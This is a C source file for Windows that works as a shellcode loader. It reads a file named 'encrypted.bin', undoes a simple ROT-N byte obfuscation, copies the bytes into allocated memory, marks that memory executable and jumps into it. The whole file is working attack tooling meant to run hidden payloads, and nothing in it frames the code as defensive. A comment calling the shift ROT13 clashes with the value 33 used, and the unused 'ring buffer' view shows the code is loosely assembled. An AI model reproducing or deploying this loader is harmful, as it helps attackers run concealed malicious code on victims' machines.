#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

void* CreateRingBuffer(unsigned int bufferSize, void** secondaryView) {
    SYSTEM_INFO sysInfo;
    void* ringBuffer = NULL;
    void* placeholder1 = NULL;
    void* placeholder2 = NULL;

    // Get system info
    GetSystemInfo(&sysInfo);

    // Round bufferSize up to be a multiple of the system's allocation granularity
    unsigned int alignedBufferSize = (bufferSize + sysInfo.dwAllocationGranularity - 1) & ~(sysInfo.dwAllocationGranularity - 1);

    // Print aligned buffer size for debugging
    printf("Aligned buffer size: %u\n", alignedBufferSize);

    // Try to allocate memory for the ring buffer
    ringBuffer = VirtualAlloc(NULL, alignedBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (ringBuffer == NULL) {
        DWORD errorCode = GetLastError();
        printf("VirtualAlloc failed for ringBuffer, error code: %#x\n", errorCode);
        return NULL;
    }

    // Try to allocate memory for the secondary view
    *secondaryView = VirtualAlloc(NULL, alignedBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*secondaryView == NULL) {
        DWORD errorCode = GetLastError();
        printf("VirtualAlloc failed for secondaryView, error code: %#x\n", errorCode);
        VirtualFree(ringBuffer, 0, MEM_RELEASE);  // Release previously allocated memory
        return NULL;
    }

    return ringBuffer;
}

/*void rot_n(unsigned char *byte, int n) {
    *byte = (*byte - n + 256) % 256;  // Reverse the ROT-N operation
}*/

// ROTN function to encrypt or decrypt a byte
void rot_n(unsigned char *byte, int n) {
    // Apply ROT-N to the byte (ensure it's in the range 0-255)
    *byte = (*byte + n) % 256;
}

int main() {
    // Open the encrypted file
    FILE *file = fopen("encrypted.bin", "rb");
    if (file == NULL) {
        perror("Error opening file");
        return -1;
    }

    // Get the file size
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    rewind(file);

    if (file_size <= 0) {
        printf("Error: file size is zero or negative\n");
        fclose(file);
        return -1;
    }

    printf("File size: %ld bytes\n", file_size);

    // Allocate memory for the shellcode using CreateRingBuffer
    void *secondaryView = NULL;
    unsigned char *ringBuffer = (unsigned char *)CreateRingBuffer(file_size, &secondaryView);
    if (ringBuffer == NULL) {
        printf("Error: Could not create ring buffer\n");
        fclose(file);
        return -1;
    }

    unsigned char decrypted_byte;
    size_t bytes_read;
    int rot_n_value = 33;  // Example: ROT13 encryption, change as needed

    // Read and decrypt the file byte-by-byte into the ring buffer
    for (size_t i = 0; i < file_size; i++) {
        bytes_read = fread(&decrypted_byte, sizeof(unsigned char), 1, file);
        if (bytes_read != 1) {
            printf("Error reading byte, returned: %zu\n", bytes_read);
            break;
        }

        // Decrypt the byte
        rot_n(&decrypted_byte, -rot_n_value);  // Reverse ROT-N

        // Write the decrypted byte into the ring buffer
        ringBuffer[i] = decrypted_byte;

        // Optionally print the decrypted byte
        printf("Decrypted byte %zu: 0x%02x\n", i, decrypted_byte);
    }

    // Make the allocated memory executable
    DWORD old_protection = 0;
    if (VirtualProtect(ringBuffer, file_size, PAGE_EXECUTE_READ, &old_protection) == 0) {
        perror("Error changing memory protection to executable");
        fclose(file);
        return -1;
    }

    // Execute the shellcode
    void (*shellcode_func)() = (void(*)())ringBuffer;
    shellcode_func();

    // Clean up
    fclose(file);
    VirtualFree(ringBuffer, 0, MEM_RELEASE);
    VirtualFree(secondaryView, 0, MEM_RELEASE);

    return 0;
}
